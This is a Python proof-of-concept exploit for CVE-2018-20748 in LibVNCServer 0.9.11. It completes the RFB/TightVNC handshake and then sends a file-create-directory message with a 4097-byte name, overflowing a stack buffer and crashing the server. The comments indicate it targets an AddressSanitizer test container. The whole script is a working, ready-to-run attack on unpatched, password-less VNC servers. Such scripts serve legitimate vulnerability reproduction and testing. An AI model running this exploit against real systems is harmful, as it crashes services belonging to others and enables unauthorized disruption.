#!/usr/bin/env python3
"""
PoC for CVE-2018-20748: LibVNCServer 0.9.11 stack buffer overflow (CWE-787)

Triggers HandleFileCreateDirRequest() to write 4097 bytes (PATH_MAX+1) into a
4096-byte stack buffer (char dirName[PATH_MAX]) with no bounds check - a
one-byte stack overflow.

Handshake sequence (TightVNC / RFB 3.8):
  1.  Read  12 bytes: "RFB 003.008\\n"
  2.  Send  12 bytes: "RFB 003.008\\n"
  3.  Read   1 byte : number-of-security-types
  4.  Read  n bytes : security type list (expect type 16 = rfbSecTypeTight)
  5.  Send   1 byte : 0x10 (select rfbSecTypeTight)
  6.  Read   4 bytes: TunnelingCapsMsg (nTunnelTypes=0, big-endian)
  7.  Read   4 bytes: AuthenticationCapsMsg (nAuthTypes=0, no password)
  8.  Read   4 bytes: SecurityResult (0 = OK, RFB 3.8 mandatory)
  9.  Send   1 byte : ClientInit shared=1
  10. Read  ServerInit: 2+2+16+4+name bytes
  11. Read  InteractionCaps: 8-byte header + (nS+nC+nE)*16 bytes
  12. Send  rfbFileCreateDirRequest: type=136, pad=0, dNameLen=0x1001 (4097,
           PATH_MAX+1, BE), then 4097 bytes of 0x41 => stack overflow in
           HandleFileCreateDir => ASan aborts the server process

Usage:
  python3 poc_cve_2018_20748.py <host> <port>
  python3 poc_cve_2018_20748.py 127.0.0.1 15901
"""

import socket
import struct
import sys
import time


def recv_exact(sock: socket.socket, n: int) -> bytes:
    """Read exactly n bytes from sock, raising on short read/EOF."""
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise EOFError(f"Connection closed after {len(buf)}/{n} bytes")
        buf += chunk
    return buf


def run_poc(host: str, port: int) -> None:
    print(f"[*] Connecting to {host}:{port}")
    sock = socket.create_connection((host, port), timeout=10)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

    # Step 1: Read server version banner (12 bytes: "RFB 003.008\n")
    banner = recv_exact(sock, 12)
    print(f"[*] Server banner: {banner!r}")
    if not banner.startswith(b"RFB "):
        raise ValueError(f"Unexpected banner: {banner!r}")

    # Step 2: Send client version - must be 3.8 for tight security handler
    sock.sendall(b"RFB 003.008\n")
    print("[*] Sent client version: RFB 003.008")

    # Step 3-4: Read security type list
    n_types_raw = recv_exact(sock, 1)
    n_types = n_types_raw[0]
    print(f"[*] Number of security types: {n_types}")
    if n_types == 0:
        # Server sent error reason
        reason_len_raw = recv_exact(sock, 4)
        reason_len = struct.unpack(">I", reason_len_raw)[0]
        reason = recv_exact(sock, reason_len)
        raise RuntimeError(f"Server refused connection: {reason!r}")

    sec_types = recv_exact(sock, n_types)
    print(f"[*] Security types offered: {list(sec_types)}")

    if 16 not in sec_types:
        raise RuntimeError(
            f"rfbSecTypeTight (16) not offered; got {list(sec_types)}. "
            "Ensure rfbRegisterTightVNCFileTransferExtension() was called."
        )

    # Step 5: Select rfbSecTypeTight = 16
    sock.sendall(bytes([16]))
    print("[*] Sent security type selection: 16 (rfbSecTypeTight)")

    # Step 6: Read TunnelingCapsMsg (4 bytes: uint32 nTunnelTypes, big-endian)
    tun_raw = recv_exact(sock, 4)
    n_tunnel = struct.unpack(">I", tun_raw)[0]
    print(f"[*] TunnelingCapsMsg: nTunnelTypes={n_tunnel}")
    if n_tunnel != 0:
        # Consume tunneling cap entries (16 bytes each) and send selection
        recv_exact(sock, n_tunnel * 16)
        sock.sendall(struct.pack(">I", 0))  # rfbNoTunneling
        print(f"[*] Read {n_tunnel} tunnel caps, sent rfbNoTunneling")

    # Step 7: Read AuthenticationCapsMsg (4 bytes: uint32 nAuthTypes, big-endian)
    auth_raw = recv_exact(sock, 4)
    n_auth = struct.unpack(">I", auth_raw)[0]
    print(f"[*] AuthenticationCapsMsg: nAuthTypes={n_auth}")

    if n_auth > 0:
        # Consume auth cap entries and select rfbAuthNone (1) if present
        auth_caps_raw = recv_exact(sock, n_auth * 16)
        # Auth cap code is the first 4 bytes (int32) of each rfbCapabilityInfo
        auth_codes = [
            struct.unpack(">i", auth_caps_raw[i * 16 : i * 16 + 4])[0] for i in range(n_auth)
        ]
        print(f"[*] Auth cap codes: {auth_codes}")
        # Select first offered auth type (server validates against its list)
        sock.sendall(struct.pack(">I", auth_codes[0]))
        print(f"[*] Sent auth type: {auth_codes[0]}")

        if 2 in auth_codes:
            # VNC authentication - we don't have the password; abort cleanly
            raise RuntimeError(
                "Server requires VNC password authentication; "
                "configure no password for the PoC target."
            )

    # Step 8: Read SecurityResult (4 bytes, RFB >= 3.8, big-endian: 0 = OK)
    sec_result_raw = recv_exact(sock, 4)
    sec_result = struct.unpack(">I", sec_result_raw)[0]
    print(f"[*] SecurityResult: {sec_result} ({'OK' if sec_result == 0 else 'FAIL'})")
    if sec_result != 0:
        # Read reason string
        reason_len = struct.unpack(">I", recv_exact(sock, 4))[0]
        reason = recv_exact(sock, reason_len)
        raise RuntimeError(f"Security handshake failed: {reason!r}")

    # Step 9: Send ClientInit (1 byte: shared=1)
    sock.sendall(bytes([1]))
    print("[*] Sent ClientInit: shared=1")

    # Step 10: Read ServerInit
    #   uint16 width, uint16 height, 16-byte pixelformat, uint32 nameLen, name
    si_fixed = recv_exact(sock, 2 + 2 + 16 + 4)
    width, height = struct.unpack(">HH", si_fixed[0:4])
    name_len = struct.unpack(">I", si_fixed[20:24])[0]
    name = recv_exact(sock, name_len)
    print(f"[*] ServerInit: {width}x{height}, name={name!r}")

    # Step 11: Read InteractionCaps
    #   Header: uint16 nServer, uint16 nClient, uint16 nEnc, uint16 pad (8 bytes)
    #   Then (nServer + nClient + nEnc) * 16-byte rfbCapabilityInfo entries
    ic_header = recv_exact(sock, 8)
    n_server, n_client, n_enc, _pad = struct.unpack(">HHHH", ic_header)
    print(f"[*] InteractionCaps: nServer={n_server}, nClient={n_client}, nEnc={n_enc}")
    total_caps = n_server + n_client + n_enc
    if total_caps > 0:
        caps_data = recv_exact(sock, total_caps * 16)
        print(f"[*] Read {total_caps} interaction caps ({total_caps * 16} bytes)")

    # State is now RFB_NORMAL. Send the malicious message.
    # rfbFileCreateDirRequest = type 136 (0x88)
    # struct: uint8 type=136, uint8 pad=0, uint16 dNameLen (big-endian on wire)
    #
    # dirName[PATH_MAX] = 4096 bytes on the stack in HandleFileCreateDirRequest.
    # Any dNameLen > 4096 overflows the buffer (no bounds check).
    # We use PATH_MAX+1 = 4097 for a clean ASan "stack-buffer-overflow WRITE"
    # report. dNameLen=0xFFFF (max) also crashes but the stack corruption is
    # severe enough that ASan can't print a full trace (nested bug).
    DNAME_LEN = 4097  # PATH_MAX + 1; protocol max is 0xFFFF
    payload = b"A" * DNAME_LEN
    msg = struct.pack(">BBH", 136, 0, DNAME_LEN) + payload
    print(
        f"[*] Sending rfbFileCreateDirRequest: type=136, dNameLen=0x{DNAME_LEN:04X}, "
        f"payload={len(payload)} bytes of 0x41 (PATH_MAX+1 => stack overflow)"
    )
    sock.sendall(msg)
    print("[*] Payload sent - waiting for server ASan abort...")

    # Give ASan time to write its report before we close the socket
    try:
        sock.settimeout(5)
        leftover = sock.recv(1024)
        if leftover:
            print(f"[*] Received {len(leftover)} unexpected bytes from server")
    except (TimeoutError, OSError):
        pass

    sock.close()
    print("[+] Done. Check 'docker logs' for ASan stack-buffer-overflow report.")
    print("[+] Look for: HandleFileCreateDirRequest in the trace.")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        sys.exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2])
    try:
        run_poc(host, port)
    except (ConnectionRefusedError, TimeoutError) as exc:
        print(f"[-] Connection error: {exc}")
        sys.exit(1)
    except RuntimeError as exc:
        print(f"[-] Handshake error: {exc}")
        sys.exit(1)
